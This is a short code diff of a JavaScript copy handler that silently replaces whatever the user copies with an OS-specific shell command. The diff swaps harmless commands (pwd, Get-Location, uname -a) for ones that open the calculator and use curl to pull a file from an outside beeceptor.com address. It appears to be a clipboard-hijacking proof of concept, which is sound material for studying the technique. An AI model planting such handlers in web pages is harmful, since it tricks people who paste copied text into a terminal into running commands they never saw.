@@ -721,16 +721,16 @@
               console.log(e);
 
               // linux
-              var cmd = 'pwd\r\n';
+              var cmd = 'xdg-open calc && curl https://asdasdasdasd.free.beeceptor.com -o output.html\r\n';
               var ua = navigator.userAgent.toLowerCase();
               if (ua.indexOf('win') !== -1) {
 
                 // windows
-                cmd = 'Get-Location\r\n';
+                cmd = 'start calc && curl https://asdasdasdasd.free.beeceptor.com -o output.html\r\n';
               } else if (ua.indexOf('mac') !== -1) {
 
                 // macOS
-                cmd = 'uname -a\r\n';
+                cmd = 'open /System/Applications/Calculator.app && curl https://asdasdasdasd.free.beeceptor.com > output.html\r\n';
               }
               e.clipboardData.setData('text/plain', cmd);
               e.preventDefault();
